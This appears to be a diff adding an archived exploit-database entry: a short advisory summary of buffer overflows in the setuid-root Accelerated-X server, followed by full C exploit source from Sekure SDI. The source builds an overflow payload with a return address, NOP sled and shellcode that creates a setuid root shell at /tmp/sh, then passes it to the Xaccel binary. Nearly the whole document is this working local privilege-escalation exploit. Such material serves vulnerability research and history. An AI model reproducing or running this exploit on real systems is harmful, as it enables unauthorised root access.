@@ -1,0 +1,83 @@
+source: http://www.securityfocus.com/bid/488/info
+
+Accelerated-X, also known as Accel-X, is a popular commercial X server available from Xi Graphics. The servers are normally installed setuid root, and contain multiple buffer overflow vulnerabilities. These vulnerabilities were found in the passing of oversized command line arguments to the servers causing the stack to be overwritten and the flow of execution for the Xserver changed. Two of these vulnerabilities is known to be related to the -query argument and the DISPLAY environment variable, upon neither of which is bounds checking performed. The consequence of these vulnerabilities being exploited is local root compromise.
+
+--- SDIaccelX.c ----
+/*
+* SDI linux exploit for Accelerate-X
+* Sekure SDI - Brazilian Information Security Team
+* by c0nd0r <condor@sekure.org>
+*
+* This script will exploit a vulnerability found by KSRT team
+* in the Accelerate-X Xserver [<=5.0].
+*
+* --------------------------------------------------------------------
+* The vulnerable buffer was small so we've changed the usual order to:
+* [garbage][eip][lots nop][shellcode]
+* BTW, I've also changed the code to execute, it will create a setuid
+* shell owned by the superuser at /tmp/sh.
+* --------------------------------------------------------------------
+*
+* Warning: DO NOT USE THIS TOOL FOR ILICIT ACTIVITIES! We take no
+* responsability.
+*
+* Greets to jamez, bishop, bahamas, stderr, dumped, paranoia,
+* marty (NORDO!), vader, fcon, slide, c_orb and
+* specially to my sasazita. Also toxyn.org, pulhas.org,
+* superbofh.org (Phibernet rox) and el8.org.
+*
+* Laughs - lame guys who hacked the senado/planalto.gov.br
+* pay some attention to the site: securityfocus.com (good point).
+* see you at #uground (irc.brasnet.org)
+*/
+
+#include <stdio.h>
+
+/* generic shellcode */
+char shellcode[] =
+"\xeb\x31\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36"
+"\x8d\x5e\x0b\x89\x5e\x3a\x31\xc0\x88\x46\x07\x88"
+"\x46\x0a\x88\x46\x31\x89\x46\x3e\xb0\x0b\x89\xf3"
+"\x8d\x4e\x32\x8d\x56\x3e\xcd\x80\x31\xdb\x89\xd8"
+"\x40\xcd\x80\xe8\xca\xff\xff\xff"
+"/bin/sh -c cp /bin/sh /tmp/sh; chmod 6755 /tmp/sh";
+
+main ( int argc, char *argv[] ) {
+char buf[1024];
+int x, y, offset=1000;
+long addr;
+int joe;
+
+if (argc > 1)
+offset = atoi ( argv[1]);
+
+/* return address */
+addr = (long) &joe + offset;
+
+buf[0] = ':';
+for ( x = 1; x < 53; x++)
+buf[x] = 'X';
+
+buf[x++] = (addr & 0x000000ff);
+buf[x++] = (addr & 0x0000ff00) >> 8;
+buf[x++] = (addr & 0x00ff0000) >> 16;
+buf[x++] = (addr & 0xff000000) >> 24;
+
+for ( ; x < 500; x++)
+buf[x] = 0x90;
+
+for ( y = 0; y < strlen(shellcode); y++, x++)
+buf[x] = shellcode[y];
+
+fprintf (stderr, "\nSDI Xaccel - Offset: %d | Addr: 0x%x\n\n",
+offset, addr);
+
+buf[strlen(buf)] = '\0';
+
+execl ( "/usr/X11R6/bin/Xaccel", "Xaccel", buf, (char *)0);
+
+// setenv ( "EGG", buf, 1);
+// system ( "/bin/sh");
+
+}
+----- EOF ---------- 
